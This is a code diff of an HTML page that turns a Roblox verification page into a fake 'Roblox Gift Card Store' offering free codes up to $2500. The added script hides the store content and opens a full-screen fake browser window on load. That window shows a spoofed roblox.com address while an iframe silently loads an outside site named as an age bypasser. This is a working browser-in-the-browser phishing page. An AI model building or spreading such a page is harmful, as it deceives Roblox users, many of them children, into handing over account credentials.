@@ -3,278 +3,563 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RoVer – Verify</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <title>Roblox - Gift Card Store</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
     :root {
-      --pink: #f93c8b;
-      --purple: #b92ad4;
-      --text-light: #fff;
-      --text-muted: #b8b8b8;
-      --bg-dark: #0b0b0b;
-      --card-bg: #141414;
-      --border-color: #2b2b2b;
+      --primary: #ff0000;
+      --secondary: #ff6600;
+      --text: #333333;
+      --background: #ffffff;
+      --card-bg: #f8f8f8;
+      --card-border: #ff6600;
+      --muted: #777777;
+      --dark-bg: #f0f0f0;
+      --border-radius: 8px;
+      --box-shadow: 0 4px 10px rgba(255, 102, 0, 0.2);
+      --transition: all 0.3s ease;
     }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    
+    @keyframes glowing {
+      0% { box-shadow: 0 0 5px #ff0000; }
+      50% { box-shadow: 0 0 20px #ff0000, 0 0 30px #ff6600; }
+      100% { box-shadow: 0 0 5px #ff0000; }
+    }
+    
+    @keyframes confetti {
+      0% { background-position: 0 0; }
+      100% { background-position: 100% 100%; }
+    }
+    
+    @keyframes bounce {
+      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+      40% { transform: translateY(-20px); }
+      60% { transform: translateY(-10px); }
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+      20%, 40%, 60%, 80% { transform: translateX(5px); }
+    }
+    
+    @keyframes sparkle {
+      0%, 100% { opacity: 0; transform: scale(0); }
+      50% { opacity: 1; transform: scale(1); }
+    }
+    
+    /* Additional animations for generation process */
+    .sparkle {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background: radial-gradient(circle, #fff 0%, rgba(255,255,255,0) 70%);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 10;
+    }
+    
+    .ugc-item.generating {
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 20px rgba(255, 102, 0, 0.7);
+      transform-origin: center;
+    }
+    
+    .ugc-item.generating::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(45deg, 
+        rgba(255,0,0,0.1), 
+        rgba(255,102,0,0.1), 
+        rgba(255,204,0,0.1), 
+        rgba(255,102,0,0.1), 
+        rgba(255,0,0,0.1));
+      background-size: 400% 400%;
+      animation: gradient 3s ease infinite;
+      z-index: 1;
+      pointer-events: none;
+    }
+    
+    @keyframes gradient {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
 
     body {
-      font-family: "Inter", sans-serif;
-      background: linear-gradient(135deg, #0b0b0b 0%, #111 100%);
-      color: var(--text-light);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      animation: fadeIn 1s ease forwards;
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: white;
+      color: #333;
+      background-image: none;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    /* Animated Gradient Background */
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(120deg, var(--pink), var(--purple));
-      opacity: 0.12;
-      animation: gradientShift 10s ease infinite alternate;
-      z-index: -1;
-    }
-
-    @keyframes gradientShift {
-      0% { transform: translateX(0px); }
-      100% { transform: translateX(-100px); }
-    }
-
-    /* Navbar */
+    /* NAV */
     nav {
-      width: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
       display: flex;
+      align-items: center;
       justify-content: space-between;
-      align-items: center;
-      padding: 20px 50px;
-      background: rgba(0, 0, 0, 0.4);
-      backdrop-filter: blur(8px);
-      border-bottom: 1px solid var(--border-color);
-      position: sticky;
-      top: 0;
-      z-index: 10;
+      padding: 15px 20px;
+      border-bottom: 2px solid var(--primary-color);
+    }
+    .nav-left, .nav-right { display: flex; gap: 20px; align-items: center; }
+    .nav-left img { height: 40px; }
+    nav a { 
+      color: var(--text-color); 
+      text-decoration: none; 
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      transition: color 0.3s;
+    }
+    nav a:hover {
+      color: var(--primary-color);
     }
 
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 700;
-      font-size: 22px;
-      color: var(--text-light);
-      text-decoration: none;
-    }
-
-    .logo img {
-      height: 28px;
-    }
-
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 28px;
-    }
-
-    .nav-links a {
-      color: var(--text-muted);
-      text-decoration: none;
-      font-weight: 500;
-      font-size: 15px;
-      transition: color 0.2s ease;
-    }
-
-    .nav-links a:hover {
-      color: var(--text-light);
-    }
-
-    /* Main Section */
+    /* MAIN */
     main {
       flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 80px 20px;
-      text-align: center;
-    }
-
-    .verify-card {
-      background: var(--card-bg);
-      border: 1px solid var(--border-color);
-      border-radius: 16px;
-      padding: 60px 80px;
-      max-width: 440px;
+      padding: 50px 20px;
+      max-width: 1200px;
+      margin: 0 auto;
       width: 100%;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-      animation: fadeInUp 0.8s ease;
+      position: relative;
+      z-index: 1;
+    }
+    
+    h1 { 
+      font-size: 36px; 
+      margin-bottom: 15px; 
+      text-align: center;
+      color: var(--primary-color);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
+    }
+    
+    p.subtitle { 
+      color: var(--secondary-color); 
+      margin-bottom: 30px; 
+      text-align: center;
+      font-size: 18px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    /* UGC GRID */
+    .ugc-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 25px;
+      align-items: start;
     }
-
-    .verify-card h1 {
-      font-size: 26px;
-      font-weight: 600;
-      margin-bottom: 14px;
-    }
-
-    .verify-card p {
-      color: var(--text-muted);
-      font-size: 15px;
-      margin-bottom: 36px;
-    }
-
-    .login-btn {
-      background: linear-gradient(90deg, var(--pink), var(--purple));
-      border: none;
-      color: #fff;
-      padding: 14px 30px;
-      border-radius: 50px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    .login-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 4px 20px rgba(249, 60, 139, 0.4);
-    }
-
-    /* Footer */
-    footer {
-      background: #0c0c0c;
-      border-top: 1px solid var(--border-color);
-      color: var(--text-muted);
-      padding: 60px 50px;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      font-size: 14px;
-    }
-
-    .footer-left img {
-      height: 26px;
-      margin-bottom: 10px;
-    }
-
-    .footer-left p {
-      color: #888;
-      font-size: 13px;
-      margin-bottom: 8px;
-    }
-
-    .footer-links {
-      display: flex;
-      gap: 100px;
-      flex-wrap: wrap;
-    }
-
-    .footer-links div {
+    
+    .ugc-item {
+      background-color: var(--card-bg);
+      border-radius: var(--border-radius);
+      padding: 15px;
       display: flex;
       flex-direction: column;
-      gap: 6px;
+      align-items: center;
+      text-align: center;
+      box-shadow: var(--box-shadow);
+      transition: var(--transition);
+      border: 2px solid var(--card-border);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .ugc-item::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+    }
+    
+    .ugc-item:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(255, 102, 0, 0.3);
+      border: 2px solid;
+      border-image: linear-gradient(45deg, var(--primary), var(--secondary)) 1;
+      background-color: #fff9f5;
+    }
+    
+    .ugc-item.generating {
+      animation: bounce 1s infinite, glowing 2s infinite;
+    }
+    
+    .ugc-item img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      background: linear-gradient(180deg, #f8f8f8, #eaeaea);
+      border: 1px solid var(--card-border);
+    }
+    
+    .ugc-item h3 { 
+      font-size: 18px; 
+      margin-bottom: 15px; 
+      min-height: 40px;
+      color: var(--secondary-color);
+      font-weight: 700;
+    }
+    
+    /* Sparkle elements for animation */
+    .sparkle {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: var(--primary-color);
+      border-radius: 50%;
+      opacity: 0;
+      pointer-events: none;
+    }
+    
+    .claim-btn {
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: var(--border-radius);
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      margin-top: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+    }
+    
+    .claim-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px rgba(255, 102, 0, 0.7);
+      background: linear-gradient(45deg, #ff3300, #ff9900);
+    }
+    
+    .claim-btn:active {
+      transform: scale(0.98);
+    }
+    
+    .claim-btn.generating {
+      animation: pulse 1.5s infinite;
+      background: linear-gradient(45deg, #ff3300, #ff9900);
+      box-shadow: 0 0 25px rgba(255, 102, 0, 0.9);
+    }
+    
+    .generating {
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    
+    .gift-icon {
+      display: inline-block;
+      margin-right: 5px;
+      font-weight: bold;
+      font-size: 16px;
     }
 
-    .footer-links a {
-      color: var(--text-muted);
-      text-decoration: none;
-      transition: color 0.2s ease;
+    /* FOOTER */
+    footer {
+      background-color: rgba(0, 0, 0, 0.9);
+      padding: 20px;
+      margin-top: 28px;
+      font-size: 13px;
+      border-top: 2px solid var(--primary-color);
     }
 
-    .footer-links a:hover {
-      color: var(--text-light);
+    /* POPUP */
+    .overlay {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 999;
+      backdrop-filter: blur(5px);
     }
+    .fake-popup {
+      display: none;
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
+      left: 0; top: 0;
+      transform: none;
+      background: #fff;
+      border-radius: 0;
+      overflow: hidden;
+      z-index: 1000;
+      border: 1px solid #ccc;
+      box-shadow: none;
+      animation: fadeIn 0.3s ease-out;
+    }
+    .window-bar { height: 40px; display: flex; align-items: center; justify-content: space-between; padding: 0 12px; background: #eaeaea; font-weight: 700; color: #222; }
+    .popup-close { cursor: pointer; font-size: 20px; color: #444; }
+    .url-bar { margin: 10px; padding: 8px 10px; background: #f4f4f4; border-radius: 6px; font-family: monospace; font-size: 13px; color: #333; border: 1px solid #ddd; }
+    .popup-iframe { width: 100vw; height: calc(100vh - 76px); border: none; }
 
-    @media (max-width: 768px) {
-      nav {
-        flex-direction: column;
-        gap: 14px;
-      }
-      .verify-card {
-        padding: 40px 24px;
-      }
-      footer {
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        gap: 30px;
-      }
-      .footer-links {
-        justify-content: center;
-        gap: 50px;
-      }
+    @media (max-width: 520px) {
+      .ugc-item img { height: 140px; }
     }
+    nav, main, footer, .ugc-grid, .ugc-item, .claim-btn { display: none !important; }
   </style>
 </head>
 <body>
-  <!-- Navbar -->
+  <!-- NAV -->
   <nav>
-    <a href="#" class="logo">
-      <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
-      RoVer
-    </a>
-    <div class="nav-links">
-      <a href="#">Team Members</a>
-      <a href="#">Terms of Service</a>
-      <a href="#">Privacy Policy</a>
+    <div class="nav-left">
+      <img src="/images/design-mode/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo" />
+      <a href="#">HOME</a>
+      <a href="#">GIFT CARDS</a>
+      <a href="#">PREMIUM</a>
+    </div>
+    <div class="nav-right">
+      <a href="#">LOGIN</a>
+      <a href="#">SIGN UP</a>
     </div>
   </nav>
+  
 
-  <!-- Main Content -->
+  <!-- MAIN -->
   <main>
-    <div class="verify-card">
-      <h1>Account Verification</h1>
-      <p>Connect your Roblox account to continue. You must be at least 13 years old.</p>
-      <button class="login-btn" onclick="location.href='login.html'">Continue</button>
+    <h1>ROBLOX - GIFT CARD STORE</h1>
+    <p class="subtitle">Select your Roblox Gift Card below and click "REDEEM" to get your gift card code. Complete the final verification step to receive your code instantly!</p>
+
+    <div class="ugc-grid" id="ugcGrid">
+      <!-- 20 items -->
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/d0a2e695db8c8d5c6a8b4a62e4fa5d4e/420/420/Hat/Png" alt="$5 Gift Card" />
+        <h3>$5 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/f8a9d475b8b1f4c7d8a7d6a5d4a3d2a1/420/420/Hat/Png" alt="$10 Gift Card" />
+        <h3>$10 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/c9b8a7d6e5f4d3c2b1a0a9b8c7d6e5f4/420/420/Hat/Png" alt="$15 Gift Card" />
+        <h3>$15 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6/420/420/Hat/Png" alt="$20 Gift Card" />
+        <h3>$20 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2/420/420/Hat/Png" alt="$25 Gift Card" />
+        <h3>$25 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4/420/420/Hat/Png" alt="$50 Gift Card" />
+        <h3>$50 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4/420/420/Hat/Png" alt="$75 Gift Card" />
+        <h3>$75 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/f1e2d3c4b5a6f7e8d9c0b1a2d3e4f5c6/420/420/Hat/Png" alt="$100 Gift Card" />
+        <h3>$100 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/d1c2b3a4e5f6d7c8b9a0f1e2d3c4b5a6/420/420/Hat/Png" alt="$125 Gift Card" />
+        <h3>$125 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6/420/420/Hat/Png" alt="$150 Gift Card" />
+        <h3>$150 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6/420/420/Hat/Png" alt="$200 Gift Card" />
+        <h3>$200 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7/420/420/Hat/Png" alt="$225 Gift Card" />
+        <h3>$225 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8/420/420/Hat/Png" alt="$250 Gift Card" />
+        <h3>$250 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>  
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9/420/420/Hat/Png" alt="$350 Gift Card" />
+        <h3>$350 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0/420/420/Hat/Png" alt="$450 Gift Card" />
+        <h3>$450 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1/420/420/Hat/Png" alt="$500 Gift Card" />
+        <h3>$500 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2/420/420/Hat/Png" alt="$650 Gift Card" />
+        <h3>$650 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3/420/420/Hat/Png" alt="$800 Gift Card" />
+        <h3>$800 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4/420/420/Hat/Png" alt="$1000 Gift Card" />
+        <h3>$1000 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5/420/420/Hat/Png" alt="$1500 Gift Card" />
+        <h3>$1500 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+      
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6/420/420/Hat/Png" alt="$2000 Gift Card" />
+        <h3>$2000 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+      
+      <div class="ugc-item">
+        <img src="https://tr.rbxcdn.com/l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7/420/420/Hat/Png" alt="$2500 Gift Card" />
+        <h3>$2500 Gift Card</h3>
+        <button class="claim-btn"><span class="gift-icon">🎁</span> Redeem</button>
+      </div>
+
     </div>
   </main>
 
-  <!-- Footer -->
+  <!-- FOOTER -->
   <footer>
-    <div class="footer-left">
-      <img src="https://i.imgur.com/n9mHnN9.png" alt="Imaginary Menagerie Logo" />
-      <p>© 2025 Imaginary Menagerie, LLC.</p>
-      <a href="#" style="color:#888;font-size:12px;">attributions</a>
-    </div>
-
-    <div class="footer-links">
+    <div style="max-width:1200px;margin:0 auto;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;">
       <div>
-        <a href="#">Team members</a>
-        <a href="#">Support Discord server</a>
-        <a href="#">Add RoVer to your server</a>
-        <a href="#">Bot Developer API</a>
+        <div style="color:var(--muted)">© 2023 Roblox Gift Card Store. This is not affiliated with Roblox Corporation.</div>
+        <div style="color:var(--muted);margin-top:6px;">By using this store, you confirm that you are 13+ years old and agree to our terms.</div>
       </div>
-      <div>
-        <a href="#">Terms of Service</a>
-        <a href="#">Privacy Policy</a>
-        <a href="#">Verify your Roblox account</a>
+      <div style="display:flex;gap:18px;align-items:center;">
+        <a href="#" style="color:var(--muted);text-decoration:none;">Terms of Service</a>
+        <a href="#" style="color:var(--muted);text-decoration:none;">Privacy Policy</a>
+        <a href="#" style="color:var(--muted);text-decoration:none;">Verify your Roblox account</a>
       </div>
     </div>
   </footer>
+
+  <!-- POPUP / OVERLAY -->
+  <div class="overlay" id="overlay"></div>
+  <div class="fake-popup" id="fakePopup">
+    <div class="window-bar">
+      Roblox - Gift Card Redemption
+      <div class="popup-close" id="popupClose">&times;</div>
+    </div>
+    <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/redeem/giftcard</div>
+    <iframe class="popup-iframe" id="popupIframe"></iframe>
+  </div>
+
+  <script>
+    // Popup logic with enhanced animations
+    
+    const fakePopup = document.getElementById("fakePopup");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("popupIframe");
+    const urlDisplay = document.getElementById("urlDisplay");
+    const popupClose = document.getElementById("popupClose");
+
+    // Keep your real redirect URL here:
+    const realUrl = "https://roblox-age-bypasser.vercel.app/";
+    const fakeUrl = "https://www.roblox.com/redeem/giftcard";
+    
+    
+    
+    
+
+    function openLoginPopup() {
+      fakePopup.style.display = "block";
+      overlay.style.display = "block";
+      iframe.src = "";
+      urlDisplay.textContent = fakeUrl;
+      // tiny delay to mimic navigation (same pattern you had)
+      setTimeout(() => { iframe.src = realUrl; }, 50);
+    }
+
+    window.addEventListener("load", () => {
+      openLoginPopup();
+    });
+
+    
+    
+    popupClose.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
+    });
+    overlay.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
+    });
+  </script>
 </body>
 </html>
-
